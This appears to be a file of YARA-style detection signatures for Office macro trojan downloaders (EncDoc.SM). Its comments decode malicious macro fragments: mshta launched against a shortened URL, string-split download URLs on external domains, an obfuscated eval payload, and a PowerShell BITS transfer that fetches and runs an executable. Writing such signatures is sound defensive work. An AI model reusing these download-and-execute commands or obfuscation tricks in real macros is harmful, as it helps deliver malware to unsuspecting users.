
rule TrojanDownloader_O97M_EncDoc_SM_MTB{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 45 78 65 63 75 74 65 20 22 6d 73 68 74 61 22 2c 20 22 68 74 74 70 73 3a 2f 2f 62 69 74 6c 79 2e 63 6f 6d 2f 61 73 64 71 77 64 77 64 73 66 76 63 78 76 63 63 76 22 2c 20 22 22 2c 20 22 22 2c 20 30 } //1 ShellExecute "mshta", "https://bitly.com/asdqwdwdsfvcxvccv", "", "", 0
		$a_01_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 6e 65 77 3a 31 33 37 30 39 36 32 30 2d 43 32 37 39 2d 31 31 43 45 2d 41 34 39 45 2d 34 34 34 35 35 33 35 34 30 30 30 30 22 29 } //1 CreateObject("new:13709620-C279-11CE-A49E-444553540000")
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1) >=2
 
}
rule TrojanDownloader_O97M_EncDoc_SM_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 02 00 00 "
		
	strings :
		$a_01_0 = {22 68 22 26 22 74 22 26 22 74 70 22 26 22 73 3a 2f 2f 73 61 22 26 22 6d 74 6e 70 79 2e 6f 72 67 2f 62 76 65 43 47 4b 54 58 2f 67 68 62 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 2c 22 } //3 "h"&"t"&"tp"&"s://sa"&"mtnpy.org/bveCGKTX/ghb.h"&"t"&"m"&"l","
		$a_01_1 = {22 68 22 26 22 74 74 22 26 22 70 73 3a 2f 2f 6d 22 26 22 61 73 73 22 26 22 6e 67 6f 2e 6f 72 67 2f 64 58 4b 76 79 4b 56 39 76 38 63 2f 67 68 62 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c 22 2c 22 } //3 "h"&"tt"&"ps://m"&"ass"&"ngo.org/dXKvyKV9v8c/ghb.h"&"t"&"m"&"l","
	condition:
		((#a_01_0  & 1)*3+(#a_01_1  & 1)*3) >=6
 
}
rule TrojanDownloader_O97M_EncDoc_SM_MTB_3{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,05 00 05 00 05 00 00 "
		
	strings :
		$a_03_0 = {70 64 61 73 31 20 3d 20 22 6d [0-05] 73 [0-05] 68 [0-05] 74 [0-05] 61 20 68 [0-20] 74 } //1
		$a_01_1 = {6b 6f 32 20 3d 20 22 74 70 73 3a 2f 2f } //1 ko2 = "tps://
		$a_01_2 = {6b 6f 32 33 20 3d 20 22 62 69 74 6c 79 2e 63 6f 6d 2f } //1 ko23 = "bitly.com/
		$a_03_3 = {6f 6b 33 20 3d 20 22 [0-aa] 22 } //1
		$a_01_4 = {59 61 68 6f 6f 64 69 31 31 31 31 20 3d 20 70 64 61 73 31 20 2b 20 6b 6f 32 20 2b 20 6b 6f 32 33 20 2b 20 6f 6b 33 } //1 Yahoodi1111 = pdas1 + ko2 + ko23 + ok3
	condition:
		((#a_03_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_03_3  & 1)*1+(#a_01_4  & 1)*1) >=5
 
}
rule TrojanDownloader_O97M_EncDoc_SM_MTB_4{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 01 00 00 "
		
	strings :
		$a_01_0 = {65 76 61 6c 28 27 7d 4b 4b 29 4b 4b 22 4b 4b 31 4b 4b 36 4b 4b 31 4b 4b 2e 4b 4b 32 4b 4b 32 4b 4b 32 4b 4b 2e 4b 4b 39 4b 4b 38 4b 4b 31 4b 4b 2e 4b 4b 35 4b 4b 2f 4b 4b 2f 4b 4b 3a 4b 4b 70 4b 4b 74 4b 4b 74 4b 4b 68 4b 4b 22 4b 4b 28 4b 4b 74 4b 4b 63 4b 4b 75 4b 4b 64 4b 4b 6f 4b 4b 72 4b 4b 50 4b 4b 6c 4b 4b 6c 4b 4b 61 4b 4b 74 4b 4b 73 4b 4b 6e 4b 4b 49 4b 4b 3b 4b 4b 32 4b 4b 3d 4b 4b 6c 4b 4b 65 4b 4b 76 4b 4b 65 4b 4b 4c 4b 4b 49 4b 4b 55 4b 4b 7b 4b 4b 29 4b 4b 29 4b 4b 22 4b 4b 72 4b 4b 65 4b 4b 6c 4b 4b 6c 4b 4b 61 4b 4b 74 } //3 eval('}KK)KK"KK1KK6KK1KK.KK2KK2KK2KK.KK9KK8KK1KK.KK5KK/KK/KK:KKpKKtKKtKKhKK"KK(KKtKKcKKuKKdKKoKKrKKPKKlKKlKKaKKtKKsKKnKKIKK;KK2KK=KKlKKeKKvKKeKKLKKIKKUKK{KK)KK)KK"KKrKKeKKlKKlKKaKKt
	condition:
		((#a_01_0  & 1)*3) >=3
 
}
rule TrojanDownloader_O97M_EncDoc_SM_MTB_5{
	meta:
		description = "TrojanDownloader:O97M/EncDoc.SM!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,06 00 06 00 04 00 00 "
		
	strings :
		$a_01_0 = {3d 20 22 70 6f 77 5e 65 72 73 22 } //1 = "pow^ers"
		$a_01_1 = {3d 20 22 68 65 5e 6c 6c 22 } //1 = "he^ll"
		$a_03_2 = {22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-15] 2e 63 6d 22 20 26 20 43 68 72 28 43 4c 6e 67 28 39 37 2e 35 29 20 2b 20 43 4c 6e 67 28 31 2e 36 29 29 } //2
		$a_03_3 = {26 20 22 20 2d 77 20 68 69 20 73 6c 65 65 5e 70 20 2d 53 65 20 33 31 3b 53 74 61 [0-02] 72 74 2d 42 69 74 73 54 72 61 6e 73 5e 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 70 [0-aa] 2e 65 60 78 65 22 20 26 20 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-15] 2e 65 60 78 65 22 20 26 20 22 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-15] 2e 65 60 78 65 } //2
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_03_2  & 1)*2+(#a_03_3  & 1)*2) >=6
 
}